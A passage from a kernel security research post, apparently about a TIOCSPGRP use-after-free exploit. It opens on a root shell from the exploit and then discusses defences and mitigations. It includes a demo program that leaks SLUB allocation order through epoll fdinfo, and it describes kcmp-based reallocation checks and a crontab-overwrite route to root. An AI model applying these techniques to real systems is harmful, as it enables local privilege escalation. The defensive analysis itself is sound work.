uid=0(root) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(lpadmin),113(scanner),120(wireshark)
root@deb10:/home/user/tiocspgrp# 
</code></pre>
<p>Note that nothing in this whole exploit requires us to leak any kernel-virtual or physical addresses, partly because we have an increment primitive instead of a plain write; and it also doesn't involve directly influencing the instruction pointer.</p>
<h1>Defence</h1>
<p>This section describes different ways in which this exploit could perhaps have been prevented from working. To assist the reader, the titles of some of the subsections refer back to specific exploit stages from the section above.</p>
<h2>Against bugs being reachable: Attack surface reduction</h2>
<p>A potential first line of defense against many kernel security issues is to only make kernel subsystems available to code that needs access to them. If an attacker does not have direct access to a vulnerable subsystem <em>and</em> doesn't have sufficient influence over a system component with access to make it trigger the issue, the issue is effectively unexploitable from the attacker's security context.</p>
<p>Pseudoterminals are (more or less) only necessary for interactively serving users who have shell access (or something resembling that), including:</p>
<ul>
<li>terminal emulators inside graphical user sessions</li>
<li>SSH servers</li>
<li><code>screen</code> sessions started from various types of terminals</li>
</ul>
<p>Things like webservers or phone apps won't normally need access to such devices; but there are exceptions. For example:</p>
<ul>
<li>a web server is used to provide a remote root shell for system administration</li>
<li>a phone app's purpose is to make a shell available to the user</li>
<li>a shell script uses <code>expect</code> to interact with a binary that requires a terminal for input/output</li>
</ul>
<p>In my opinion, the biggest limits on attack surface reduction as a defensive strategy are:</p>
<ol>
<li>It exposes a workaround to <em>an implementation concern</em> of the kernel (potential memory safety issues) in user-facing API, which can lead to compatibility issues and maintenance overhead - for example, from a security standpoint, I think it might be a good idea to require phone apps and systemd services to declare their intention to use the PTY subsystem at install time, but that would be an API change requiring some sort of action from application authors, creating friction that wouldn't be necessary if we were confident that the kernel is working properly. This might get especially messy in the case of software that invokes external binaries depending on configuration, e.g. a web server that needs PTY access when it is used for server administration. (This is somewhat less complicated when a benign-but-potentially-exploitable application actively applies restrictions to itself; but not every application author is necessarily willing to design a fine-grained sandbox for their code, and even then, <a href="https://lwn.net/Articles/738694/">there may be compatibility issues caused by libraries outside the application author's control</a>.)</li>
<li>It can't protect a subsystem from a context that fundamentally needs access to it. (E.g. Android's <code>/dev/binder</code> is directly accessible by Chrome renderers on Android because they have Android code running inside them.)</li>
<li>It means that decisions that ought to not influence the security of a system (making an API that does not grant extra privileges available to some potentially-untrusted context) essentially involve a security tradeoff.</li>
</ol>
<p>Still, in practice, I believe that attack surface reduction mechanisms (especially seccomp) are currently some of the most important defense mechanisms on Linux.</p>
<h2>Against bugs in source code: Compile-time locking validation</h2>
<p>The bug in <code>TIOCSPGRP</code> was a fairly straightforward violation of a straightforward locking rule: While a <code>tty_struct</code> is live, accessing its <code>pgrp</code> member is forbidden unless the <code>ctrl_lock</code> of the same <code>tty_struct</code> is held. This rule is sufficiently simple that it wouldn't be entirely unreasonable to expect the compiler to be able to verify it - as long as you somehow inform the compiler about this rule, because figuring out the intended locking rules just from looking at a piece of code can often be hard even for humans (especially when some of the code is incorrect).</p>
<p>When you are starting a new project from scratch, <a href="https://alexgaynor.net/2019/aug/12/introduction-to-memory-unsafety-for-vps-of-engineering/">the overall best way to approach this is to use a memory-safe language</a> - in other words, a language that has explicitly been designed such that the programmer has to provide the compiler with enough information about intended memory safety semantics that the compiler can automatically verify them. But for existing codebases, it might be worth looking into how much of this can be retrofitted.</p>
<p>Clang's <a href="https://clang.llvm.org/docs/ThreadSafetyAnalysis.html">Thread Safety Analysis</a> feature does something vaguely like what we'd need to verify the locking in this situation:</p>
<pre><code>$ nl -ba -s' ' thread-safety-test.cpp | sed 's|^   ||'
  1 struct __attribute__((capability("mutex"))) mutex {
  2 };
  3 
  4 void lock_mutex(struct mutex *p) __attribute__((acquire_capability(*p)));
  5 void unlock_mutex(struct mutex *p) __attribute__((release_capability(*p)));
  6 
  7 struct foo {
  8     int a __attribute__((guarded_by(mutex)));
  9     struct mutex mutex;
 10 };
 11 
 12 int good(struct foo *p1, struct foo *p2) {
 13     lock_mutex(&amp;p1-&gt;mutex);
 14     int result = p1-&gt;a;
 15     unlock_mutex(&amp;p1-&gt;mutex);
 16     return result;
 17 }
 18 
 19 int bogus(struct foo *p1, struct foo *p2) {
 20     lock_mutex(&amp;p1-&gt;mutex);
 21     int result = p2-&gt;a;
 22     unlock_mutex(&amp;p1-&gt;mutex);
 23     return result;
 24 }
$ clang++ -c -o thread-safety-test.o thread-safety-test.cpp -Wall -Wthread-safety
thread-safety-test.cpp:21:22: warning: reading variable 'a' requires holding mutex 'p2-&gt;mutex' [-Wthread-safety-precise]
    int result = p2-&gt;a;
                     ^
thread-safety-test.cpp:21:22: note: found near match 'p1-&gt;mutex'
1 warning generated.
$ 
</code></pre>
<p>However, this does not currently work when compiling as C code because the <code>guarded_by</code> attribute can't find the other struct member; it seems to have been designed mostly for use in C++ code. A more fundamental problem is that it also doesn't appear to have built-in support for distinguishing the different rules for accessing a struct member depending on the lifetime state of the object. For example, almost all objects with locked members will have initialization/destruction functions that have exclusive access to the entire object and can access members without locking. (The lock might not even be initialized in those states.)</p>
<p>Some objects also have more lifetime states; in particular, for many objects with RCU-managed lifetime, only a subset of the members may be accessed through an RCU reference without having upgraded the reference to a refcounted one beforehand. Perhaps this could be addressed by introducing a new type attribute that can be used to mark pointers to structs in special lifetime states? (For C++ code, Clang's Thread Safety Analysis simply disables all checks in all constructor/destructor functions.)</p>
<p>I am hopeful that, with some extensions, something vaguely like Clang's Thread Safety Analysis could be used to retrofit some level of compile-time safety against unintended data races. This will require adding a lot of annotations, in particular to headers, to document intended locking semantics; but such annotations are probably anyway necessary to enable productive work on a complex codebase. In my experience, when there are no detailed comments/annotations on locking rules, every attempt to change a piece of code you're not intimately familiar with (without introducing horrible memory safety bugs) turns into a foray into the thicket of the surrounding call graphs, trying to unravel the intentions behind the code.</p>
<p>The one big downside is that this requires getting the development community for the codebase on board with the idea of backfilling and maintaining such annotations. And someone has to write the analysis tooling that can verify the annotations.</p>
<p>At the moment, the Linux kernel does have some very coarse locking validation via <code>sparse</code>; but this infrastructure is not capable of detecting situations where the wrong lock is used or validating that a struct member is protected by a lock. It also can't properly deal with things like conditional locking, which makes it hard to use for anything other than spinlocks/RCU. The kernel's runtime locking validation via <code>LOCKDEP</code> is more advanced, but mostly with a focus on locking correctness of RCU pointers as well as deadlock detection (the main focus); again, there is no mechanism to, for example,automatically validate that a given struct member is only accessed under a specific lock (which would probably also be quite costly to implement with runtime validation). Also, as a runtime validation mechanism, it can't discover errors in code that isn't executed during testing (although it can combine separately observed behavior into race scenarios without ever actually observing the race).</p>
<h2>Against bugs in source code: Global static locking analysis</h2>
<p>An alternative approach to checking memory safety rules at compile time is to do it either after the entire codebase has been compiled, or with an external tool that analyzes the entire codebase. This allows the analysis tooling to perform analysis across compilation units, reducing the amount of information that needs to be made explicit in headers. This may be a more viable approach if peppering annotations everywhere across headers isn't viable; but it also reduces the utility to human readers of the code, unless the inferred semantics are made visible to them through some special code viewer. It might also be less ergonomic in the long run if changes to one part of the kernel could make the verification of other parts fail - especially if those failures only show up in some configurations.</p>
<p>I think global static analysis is probably a good tool for finding some subsets of bugs, and it might also help with finding the worst-case depth of kernel stacks or proving the absence of deadlocks, but it's probably less suited for proving memory safety correctness?</p>
<h2>Against exploit primitives: Attack primitive reduction via syscall restrictions</h2>
<p>(Yes, I made up that name because I thought that capturing this under "Attack surface reduction" is too muddy.)</p>
<p>Because allocator fastpaths (both in SLUB and in the page allocator) are implemented using per-CPU data structures, the ease and reliability of exploits that want to coax the kernel's memory allocators into reallocating memory in specific ways can be improved if the attacker has fine-grained control over the assignment of exploit threads to CPU cores. I'm calling such a capability, which provides a way to facilitate exploitation by influencing relevant system state/behavior, an "attack primitive" here. Luckily for us, Linux allows tasks to pin themselves to specific CPU cores without requiring any privilege using the <code>sched_setaffinity()</code> syscall.</p>
<p>(As a different example, one primitive that can provide an attacker with fairly powerful capabilities is being able to indefinitely stall kernel faults on userspace addresses via <a href="https://googleprojectzero.blogspot.com/2016/06/exploiting-recursion-in-linux-kernel_20.html#:~:text=pause%20the%20kernel%20thread">FUSE</a> or userfaultfd.)</p>
<p>Just like in the section "Attack surface reduction" above, an attacker's ability to use these primitives can be reduced by filtering syscalls; but while the mechanism and the compatibility concerns are similar, the rest is fairly different:</p>
<p>Attack primitive reduction does not normally reliably prevent a bug from being exploited; and an attacker will sometimes even be able to obtain a similar but shoddier (more complicated, less reliable, less generic, ...) primitive indirectly, for example:</p>
<ul>
<li>Instead of <code>sched_setaffinity()</code>, an attacker could attempt to launch several threads, let them poll <code>getcpu()</code> to figure out which cores they're running on, and then dispatch work to the threads as appropriate.</li>
<li>Instead of delaying page faults with FUSE or userfaultfd, <a href="https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019%20-%20Exploiting%20race%20conditions%20on%20Linux.pdf#page=30">an attacker may be able to abuse discontiguous file mappings and scheduler behavior</a>.</li>
</ul>
<p>Attack surface reduction is about limiting access to code that is suspected to contain exploitable bugs; in a codebase written in a memory-unsafe language, that tends to apply to pretty much the entire codebase. Attack surface reduction is often fairly opportunistic: You permit the things you need, and deny the rest by default.</p>
<p>Attack primitive reduction limits access to code that is suspected or known to provide (sometimes very specific) exploitation primitives. For example, one might decide to specifically forbid access to FUSE and userfaultfd for most code because of their utility for kernel exploitation, and, if one of those interfaces is truly needed, design a workaround that avoids exposing the attack primitive to userspace. This is different from attack surface reduction, where it often makes sense to permit access to any feature that a legitimate workload wants to use.</p>
<p>A nice example of an attack primitive reduction is the sysctl <code>vm.unprivileged_userfaultfd</code>, <a href="https://git.kernel.org/linus/cefdca0a86be">which was first introduced</a> so that userfaultfd can be made completely inaccessible to normal users and <a href="https://git.kernel.org/linus/d0d4730ac2e4">was then later adjusted</a> so that users can be granted access to part of its functionality without gaining the dangerous attack primitive.  (But if you can create unprivileged user namespaces, <a href="https://twitter.com/tehjh/status/1438330352075001856">you can still use FUSE</a> to get an equivalent effect.)</p>
<p>When maintaining lists of allowed syscalls for a sandboxed system component, or something along those lines, it may be a good idea to explicitly track which syscalls are explicitly forbidden for attack primitive reduction reasons, or similarly strong reasons - otherwise one might accidentally end up permitting them in the future. (I guess that's kind of similar to issues that one can run into when maintaining ACLs...)</p>
<p>But like in the previous section, attack primitive reduction also tends to rely on making some functionality unavailable, and so it might not be viable in all situations. For example, newer versions of Android deliberately indirectly give apps access to FUSE through <a href="https://developer.android.com/reference/android/os/storage/StorageManager#openProxyFileDescriptor(int,%20android.os.ProxyFileDescriptorCallback,%20android.os.Handler)">the AppFuse mechanism</a>. (That API doesn't actually give an app direct access to <code>/dev/fuse</code>, but it does forward read/write requests to the app.)</p>
<h2>Against oops-based oracles: Lockout or panic on crash</h2>
<p>The ability to recover from kernel oopses in an exploit can help an attacker compensate for a lack of information about system state. Under some circumstances, it can even serve as a binary oracle that can be used to more or less perform a binary search for a value, or something like that.</p>
<p>(<a href="https://googleprojectzero.blogspot.com/2018/09/a-cache-invalidation-bug-in-linux.html">It used to be even worse on some distributions</a>, where <code>dmesg</code> was accessible for unprivileged users; so if you managed to trigger an oops or <code>WARN</code>, you could then grab the register states at all IRET frames in the kernel stack, which <a href="https://googleprojectzero.blogspot.com/2018/09/a-cache-invalidation-bug-in-linux.html#:~:text=Leaking%20pointers%20from%20dmesg">could be used to leak things like kernel pointers</a>. Luckily nowadays most distributions, including <a href="https://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/groovy/commit/?id=f2fac7568f6acdb37de0696717f23dedc02fbe48">Ubuntu 20.10</a>, restrict <code>dmesg</code> access.)</p>
<p>Android and Chrome OS nowadays set the kernel's <code>panic_on_oops</code> flag, meaning the machine will immediately restart when a kernel oops happens. This makes it hard to use oopsing as part of an exploit, and arguably also makes more sense from a reliability standpoint - the system will be down for a bit, and it will lose its existing state, but it will also reset into a known-good state instead of continuing in a potentially half-broken state, especially if the crashing thread was holding mutexes that can never again be released, or things like that. On the other hand, if some service crashes on a desktop system, perhaps that shouldn't cause the whole system to immediately go down and make you lose unsaved state - so <code>panic_on_oops</code> might be too drastic there.</p>
<p>A good solution to this might require a more fine-grained approach. (For example, grsecurity has for a long time had the ability to lock out specific UIDs that have caused crashes.) Perhaps it would make sense to allow the <code>init</code> daemon to use different policies for crashes in different services/sessions/UIDs?</p>
<h2>Against UAF access: Deterministic UAF mitigation</h2>
<p>One defense that would reliably stop an exploit for this issue would be a deterministic use-after-free mitigation. Such a mitigation would reliably protect the memory formerly occupied by the object from accesses through dangling pointers to the object, at least once the memory has been reused for a different purpose (including reuse to store heap metadata). For write operations, this probably requires either atomicity of the access check and the actual write or an RCU-like delayed freeing mechanism. For simple read operations, it can also be implemented by ordering the access check after the read, but before the read value is used.</p>
<p>A big downside of this approach on its own is that extra checks on every memory access will probably come with an extremely high efficiency penalty, especially if the mitigation can not make any assumptions about what kinds of parallel accesses might be happening to an object, or what semantics pointers have. (The proof-of-concept implementation I presented at LSSNA 2020 (<a href="https://static.sched.com/hosted_files/lssna2020/0b/LSSNA_2020_Jann_Horn_UAF_Mitigation.pdf">slides</a>, <a href="https://www.youtube.com/watch?v=uE1w0Mxldwk">recording</a>) had CPU overhead roughly in the range 60%-159% in kernel-heavy benchmarks, and ~8% for a very userspace-heavy benchmark.)</p>
<p>Unfortunately, even a deterministic use-after-free mitigation often won't be enough to deterministically limit the blast radius of something like a refcounting mistake to the object in which it occurred. Consider a case where two codepaths concurrently operate on the same object: Codepath A assumes that the object is live and subject to normal locking rules. Codepath B knows that the reference count reached zero, assumes that it therefore has exclusive access to the object (meaning all members are mutable without any locking requirements), and is trying to tear down the object. Codepath B might then start dropping references the object was holding on other objects while codepath A is following the same references. This could then lead to use-after-frees on pointed-to objects. If all data structures are subject to the same mitigation, this might not be too much of a problem; but if some data structures (like <code>struct page</code>) are not protected, it might permit a mitigation bypass.</p>
<p>Similar issues apply to data structures with <code>union</code> members that are used in different object states; for example, here's some random kernel data structure with an <code>rcu_head</code> in a <code>union</code> (just a random example, there isn't anything wrong with this code as far as I know):</p>
<pre><code>struct allowedips_node {
    struct wg_peer __rcu *peer;
    struct allowedips_node __rcu *bit[2];
    /* While it may seem scandalous that we waste space for v4,
     * we're alloc'ing to the nearest power of 2 anyway, so this
     * doesn't actually make a difference.
     */
    u8 bits[16] __aligned(__alignof(u64));
    u8 cidr, bit_at_a, bit_at_b, bitlen;

    /* Keep rarely used list at bottom to be beyond cache line. */
    union {
        struct list_head peer_list;
        struct rcu_head rcu;
    };
};
</code></pre>
<p>As long as everything is working properly, the <code>peer_list</code> member is only used while the object is live, and the <code>rcu</code> member is only used after the object has been scheduled for delayed freeing; so this code is completely fine. But <em>if</em> a bug somehow caused the <code>peer_list</code> to be read after the <code>rcu</code> member has been initialized, type confusion would result.</p>
<p>In my opinion, this demonstrates that while UAF mitigations do have a lot of value (and would have reliably prevented exploitation of this specific bug), <strong>a use-after-free is just one possible consequence of the symptom class "object state confusion"</strong> (which may or may not be the same as the bug class of the root cause). It would be even better to enforce rules on object states, and ensure that an object e.g. can't be accessed through a "refcounted" reference anymore after the refcount has reached zero and has logically transitioned into a state like "non-RCU members are exclusively owned by thread performing teardown" or "RCU callback pending, non-RCU members are uninitialized" or "exclusive access to RCU-protected members granted to thread performing teardown, other members are uninitialized". Of course, doing this as a runtime mitigation would be even costlier and messier than a reliable UAF mitigation; this level of protection is probably only realistic with at least some level of annotations and static validation.</p>
<h2>Against UAF access: Probabilistic UAF mitigation; pointer leaks</h2>
<p><strong>Summary: Some types of probabilistic UAF mitigation break if the attacker can leak information about pointer values; and information about pointer values easily leaks to userspace, e.g. through pointer comparisons in map/set-like structures.</strong></p>
<p>If a deterministic UAF mitigation is too costly, an alternative is to do it probabilistically; for example, by tagging pointers with a small number of bits that are checked against object metadata on access, and then changing that object metadata when objects are freed.</p>
<p>The downside of this approach is that information leaks can be used to break the protection. One example of a type of information leak that I'd like to highlight (without any judgment on the relative importance of this compared to other types of information leaks) are intentional pointer comparisons, which have quite a few facets.</p>
<p>A relatively straightforward example where this could be an issue is the <a href="https://man7.org/linux/man-pages/man2/kcmp.2.html"><code>kcmp()</code></a> syscall. This syscall compares two kernel objects using an arithmetic comparison of their permuted pointers (using a per-boot randomized permutation, see <code>kptr_obfuscate()</code>) and returns the result of the comparison (smaller, equal or greater). This gives userspace a way to order handles to kernel objects (e.g. file descriptors) based on the identities of those kernel objects (e.g. <code>struct file</code> instances), which in turn allows userspace to group a set of such handles by backing kernel object in <code>O(n*log(n))</code> time using a standard sorting algorithm.</p>
<p>This syscall can be abused for improving the reliability of use-after-free exploits against some struct types because it checks whether two pointers to kernel objects are equal without accessing those objects: An attacker can allocate an object, somehow create a reference to the object that is not counted properly, free the object, reallocate it, and then verify whether the reallocation indeed reused the same address by comparing the dangling reference and a reference to the new object with <code>kcmp()</code>. If <code>kcmp()</code> includes the pointer's tag bits in the comparison, this would likely also permit breaking probabilistic UAF mitigations.</p>
<p>Essentially the same concern applies when a kernel pointer is encrypted and then given to userspace in <code>fuse_lock_owner_id()</code>, which encrypts the pointer to a <code>files_struct</code> with an open-coded version of <a href="https://en.wikipedia.org/wiki/XTEA">XTEA</a> before passing it to a FUSE daemon.</p>
<p>In both these cases, explicitly stripping tag bits would be an acceptable workaround because a pointer without tag bits still uniquely identifies a memory location; and given that these are very special interfaces that intentionally expose some degree of information about kernel pointers to userspace, it would be reasonable to adjust this code manually.</p>
<p>A somewhat more interesting example is the behavior of this piece of userspace code:</p>
<pre><code>#define _GNU_SOURCE
#include &lt;sys/epoll.h&gt;
#include &lt;sys/eventfd.h&gt;
#include &lt;sys/resource.h&gt;
#include &lt;err.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sched.h&gt;

#define SYSCHK(x) ({          \
  typeof(x) __res = (x);      \
  if (__res == (typeof(x))-1) \
    err(1, "SYSCHK(" #x ")"); \
  __res;                      \
})

int main(void) {
  struct rlimit rlim;
  SYSCHK(getrlimit(RLIMIT_NOFILE, &amp;rlim));
  rlim.rlim_cur = rlim.rlim_max;
  SYSCHK(setrlimit(RLIMIT_NOFILE, &amp;rlim));

  cpu_set_t cpuset;
  CPU_ZERO(&amp;cpuset);
  CPU_SET(0, &amp;cpuset);
  SYSCHK(sched_setaffinity(0, sizeof(cpuset), &amp;cpuset));

  int epfd = SYSCHK(epoll_create1(0));
  for (int i=0; i&lt;1000; i++)
    SYSCHK(eventfd(0, 0));
  for (int i=0; i&lt;192; i++) {
    int fd = SYSCHK(eventfd(0, 0));
    struct epoll_event event = {
      .events = EPOLLIN,
      .data = { .u64 = i }
    };
    SYSCHK(epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;event));
  }

  char cmd[100];
  sprintf(cmd, "cat /proc/%d/fdinfo/%d", getpid(), epfd);
  system(cmd);
}
</code></pre>
<p>It first creates a ton of eventfds that aren't used. Then it creates a bunch more eventfds and creates epoll watches for them, in creation order, with a monotonically incrementing counter in the "data" field. Afterwards, it asks the kernel to print the current state of the epoll instance, which comes with a list of all registered epoll watches, including the value of the <code>data</code> member (in hex). But how is this list sorted? Here's the result of running that code in a Ubuntu 20.10 VM (truncated, because it's a bit long):</p>
<pre><code>user@ubuntuvm:~/epoll_fdinfo$ ./epoll_fdinfo 
pos:    0
flags:  02
mnt_id: 14
tfd:     1040 events:       19 data:               24  pos:0 ino:2f9a sdev:d
tfd:     1050 events:       19 data:               2e  pos:0 ino:2f9a sdev:d
tfd:     1024 events:       19 data:               14  pos:0 ino:2f9a sdev:d
tfd:     1029 events:       19 data:               19  pos:0 ino:2f9a sdev:d
tfd:     1048 events:       19 data:               2c  pos:0 ino:2f9a sdev:d
tfd:     1042 events:       19 data:               26  pos:0 ino:2f9a sdev:d
tfd:     1026 events:       19 data:               16  pos:0 ino:2f9a sdev:d
tfd:     1033 events:       19 data:               1d  pos:0 ino:2f9a sdev:d
[...]
</code></pre>
<p>The <code>data:</code> field here is the loop index we stored in the <code>.data</code> member, formatted as hex. Here is the complete list of the <code>data</code> values in decimal:</p>
<pre><code>36, 46, 20, 25, 44, 38, 22, 29, 30, 45, 33, 28, 41, 31, 23, 37, 24, 50, 32, 26, 21, 43, 35, 48, 27, 39, 40, 47, 42, 34, 49, 19, 95, 105, 111, 84, 103, 97, 113, 88, 89, 104, 92, 87, 100, 90, 114, 96, 83, 109, 91, 85, 112, 102, 94, 107, 86, 98, 99, 106, 101, 93, 108, 110, 12, 1, 14, 5, 6, 9, 4, 17, 7, 13, 0, 8, 2, 11, 3, 15, 16, 18, 10, 135, 145, 119, 124, 143, 137, 121, 128, 129, 144, 132, 127, 140, 130, 122, 136, 123, 117, 131, 125, 120, 142, 134, 115, 126, 138, 139, 146, 141, 133, 116, 118, 66, 76, 82, 55, 74, 68, 52, 59, 60, 75, 63, 58, 71, 61, 53, 67, 54, 80, 62, 56, 51, 73, 65, 78, 57, 69, 70, 77, 72, 64, 79, 81, 177, 155, 161, 166, 153, 147, 163, 170, 171, 154, 174, 169, 150, 172, 164, 178, 165, 159, 173, 167, 162, 152, 176, 157, 168, 148, 149, 156, 151, 175, 158, 160, 186, 188, 179, 180, 183, 191, 181, 187, 182, 185, 189, 190, 184
</code></pre>
<p>While these look sort of random, you can see that the list can be split into blocks of length 32 that consist of shuffled contiguous sequences of numbers:</p>
<pre><code>Block 1 (32 values in range 19-50):
36, 46, 20, 25, 44, 38, 22, 29, 30, 45, 33, 28, 41, 31, 23, 37, 24, 50, 32, 26, 21, 43, 35, 48, 27, 39, 40, 47, 42, 34, 49, 19

Block 2 (32 values in range 83-114):
95, 105, 111, 84, 103, 97, 113, 88, 89, 104, 92, 87, 100, 90, 114, 96, 83, 109, 91, 85, 112, 102, 94, 107, 86, 98, 99, 106, 101, 93, 108, 110

Block 3 (19 values in range 0-18):
12, 1, 14, 5, 6, 9, 4, 17, 7, 13, 0, 8, 2, 11, 3, 15, 16, 18, 10

Block 4 (32 values in range 115-146):
135, 145, 119, 124, 143, 137, 121, 128, 129, 144, 132, 127, 140, 130, 122, 136, 123, 117, 131, 125, 120, 142, 134, 115, 126, 138, 139, 146, 141, 133, 116, 118

Block 5 (32 values in range 51-82):
66, 76, 82, 55, 74, 68, 52, 59, 60, 75, 63, 58, 71, 61, 53, 67, 54, 80, 62, 56, 51, 73, 65, 78, 57, 69, 70, 77, 72, 64, 79, 81

Block 6 (32 values in range 147-178):
177, 155, 161, 166, 153, 147, 163, 170, 171, 154, 174, 169, 150, 172, 164, 178, 165, 159, 173, 167, 162, 152, 176, 157, 168, 148, 149, 156, 151, 175, 158, 160

Block 7 (13 values in range 179-191):
186, 188, 179, 180, 183, 191, 181, 187, 182, 185, 189, 190, 184
</code></pre>
<p>What's going on here becomes clear when you look at the data structures <code>epoll</code> uses internally. <code>ep_insert</code> calls <code>ep_rbtree_insert</code> to insert a <code>struct epitem</code> into a red-black tree (a type of sorted binary tree); and this red-black tree is sorted using a tuple of a <code>struct file *</code> and a file descriptor number:</p>
<pre><code>/* Compare RB tree keys */
static inline int ep_cmp_ffd(struct epoll_filefd *p1,
                             struct epoll_filefd *p2)
{
        return (p1-&gt;file &gt; p2-&gt;file ? +1:
                (p1-&gt;file &lt; p2-&gt;file ? -1 : p1-&gt;fd - p2-&gt;fd));
}
</code></pre>
<p>So the values we're seeing have been ordered based on the virtual address of the corresponding <code>struct file</code>; and SLUB allocates <code>struct file</code> from order-1 pages (i.e. pages of size 8 KiB), which can hold 32 objects each:</p>
<pre><code>root@ubuntuvm:/sys/kernel/slab/filp# cat order 
1
root@ubuntuvm:/sys/kernel/slab/filp# cat objs_per_slab 
32
root@ubuntuvm:/sys/kernel/slab/filp# 
</code></pre>
<p>This explains the grouping of the numbers we saw: Each block of 32 contiguous values corresponds to an order-1 page that was previously empty and is used by SLUB to allocate objects until it becomes full.</p>
<p>With that knowledge, we can transform those numbers a bit, to show the order in which objects were allocated inside each page (excluding pages for which we haven't seen all allocations):</p>
<pre><code>$ cat slub_demo.py 
#!/usr/bin/env python3
blocks = [
  [ 36, 46, 20, 25, 44, 38, 22, 29, 30, 45, 33, 28, 41, 31, 23, 37, 24, 50, 32, 26, 21, 43, 35, 48, 27, 39, 40, 47, 42, 34, 49, 19 ],
  [ 95, 105, 111, 84, 103, 97, 113, 88, 89, 104, 92, 87, 100, 90, 114, 96, 83, 109, 91, 85, 112, 102, 94, 107, 86, 98, 99, 106, 101, 93, 108, 110 ],
  [ 12, 1, 14, 5, 6, 9, 4, 17, 7, 13, 0, 8, 2, 11, 3, 15, 16, 18, 10 ],
  [ 135, 145, 119, 124, 143, 137, 121, 128, 129, 144, 132, 127, 140, 130, 122, 136, 123, 117, 131, 125, 120, 142, 134, 115, 126, 138, 139, 146, 141, 133, 116, 118 ],
  [ 66, 76, 82, 55, 74, 68, 52, 59, 60, 75, 63, 58, 71, 61, 53, 67, 54, 80, 62, 56, 51, 73, 65, 78, 57, 69, 70, 77, 72, 64, 79, 81 ],
  [ 177, 155, 161, 166, 153, 147, 163, 170, 171, 154, 174, 169, 150, 172, 164, 178, 165, 159, 173, 167, 162, 152, 176, 157, 168, 148, 149, 156, 151, 175, 158, 160 ],
  [ 186, 188, 179, 180, 183, 191, 181, 187, 182, 185, 189, 190, 184 ]
]

for alloc_indices in blocks:
  if len(alloc_indices) != 32:
    continue
  # indices of allocations ('data'), sorted by memory location, shifted to be relative to the block
  alloc_indices_relative = [position - min(alloc_indices) for position in alloc_indices]
  # reverse mapping: memory locations of allocations,
  # sorted by index of allocation ('data').
  # if we've observed all allocations in a page,
  # these will really be indices into the page.
  memory_location_by_index = [alloc_indices_relative.index(idx) for idx in range(0, len(alloc_indices))]
  print(memory_location_by_index)
$ ./slub_demo.py 
[31, 2, 20, 6, 14, 16, 3, 19, 24, 11, 7, 8, 13, 18, 10, 29, 22, 0, 15, 5, 25, 26, 12, 28, 21, 4, 9, 1, 27, 23, 30, 17]
[16, 3, 19, 24, 11, 7, 8, 13, 18, 10, 29, 22, 0, 15, 5, 25, 26, 12, 28, 21, 4, 9, 1, 27, 23, 30, 17, 31, 2, 20, 6, 14]
[23, 30, 17, 31, 2, 20, 6, 14, 16, 3, 19, 24, 11, 7, 8, 13, 18, 10, 29, 22, 0, 15, 5, 25, 26, 12, 28, 21, 4, 9, 1, 27]
[20, 6, 14, 16, 3, 19, 24, 11, 7, 8, 13, 18, 10, 29, 22, 0, 15, 5, 25, 26, 12, 28, 21, 4, 9, 1, 27, 23, 30, 17, 31, 2]
[5, 25, 26, 12, 28, 21, 4, 9, 1, 27, 23, 30, 17, 31, 2, 20, 6, 14, 16, 3, 19, 24, 11, 7, 8, 13, 18, 10, 29, 22, 0, 15]
</code></pre>
<p>And these sequences are almost the same, except that they have been rotated around by different amounts. This is exactly the SLUB freelist randomization scheme, as introduced in <a href="https://git.kernel.org/linus/210e7a43fa905">commit 210e7a43fa905</a>!</p>
<p>When a SLUB <code>kmem_cache</code> is created (an instance of the SLUB allocator for a specific size class and potentially other specific attributes, usually initialized at boot time), <code>init_cache_random_seq</code> and <code>cache_random_seq_create</code> fill an array <code>-&gt;random_seq</code> with randomly-ordered object indices via Fisher-Yates shuffle, with the array length equal to the number of objects that fit into a page. Then, whenever SLUB grabs a new page from the lower-level page allocator, it initializes the page freelist using the indices from <code>-&gt;random_seq</code>, starting at a random index in the array (and wrapping around when the end is reached). (I'm ignoring the low-order allocation fallback here.)</p>
<p>So in summary, we can bypass SLUB randomization for the slab from which <code>struct file</code> is allocated because someone used it as a lookup key in a specific type of data structure. This is already fairly undesirable if SLUB randomization is supposed to provide protection against some types of local attacks for all slabs.</p>
<p>The heap-randomization-weakening effect of such data structures is not necessarily limited to cases where elements of the data structure can be listed in-order by userspace: If there was a codepath that iterated through the tree in-order and freed all tree nodes, that could have a similar effect, because the objects would be placed on the allocator's freelist sorted by address, cancelling out the randomization. In addition, you might be able to leak information about iteration order through cache side channels or such.</p>
<p>If we introduce a probabilistic use-after-free mitigation that relies on attackers not being able to learn whether the uppermost bits of an object's address changed after it was reallocated, this data structure could also break that. This case is messier than things like <code>kcmp()</code> because here the address ordering leak stems from a standard data structure.</p>
<p>You may have noticed that some of the examples I'm using here would be more or less limited to cases where an attacker is reallocating memory <em>with the same type as the old allocation</em>, while a typical use-after-free attack ends up replacing an object with a differently-typed one to cause type confusion. As an example of a bug that can be exploited for privilege escalation without type confusion at the C structure level, see <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=808">entry 808 in our bugtracker</a>. My exploit for that bug first starts a <code>writev()</code> operation on a writable file, lets the kernel validate that the file is indeed writable, then replaces the <code>struct file</code> with a read-only <code>file</code> pointing to <code>/etc/crontab</code>, and lets <code>writev()</code> continue. This allows gaining root privileges through a use-after-free bug without having to mess around with kernel pointers, data structure layouts, ROP, or anything like that. Of course that approach doesn't work with every use-after-free though.</p>
<p>(By the way: For an example of pointer leaks through container data structures in a JavaScript engine, see <a href="https://thejh.net/misc/firefox-cve-2016-9904-and-cve-2017-5378-bugreport">this bug I reported to Firefox back in 2016, when I wasn't a Google employee</a>, which leaks the low 32 bits of a pointer by timing operations on pessimal hash tables - basically turning the HashDoS attack into an infoleak. Of course, nowadays, a side-channel-based pointer leak in a JS engine would probably not be worth treating as a security bug anymore, since you can probably get the same result with Spectre...)</p>
<h2>Against freeing SLUB pages: Preventing virtual address reuse beyond the slab</h2>
<p>(Also discussed a little bit on the kernel-hardening list in <a href="https://lore.kernel.org/kernel-hardening/20201006004414.GP20115@casper.infradead.org/">this thread</a>.)</p>
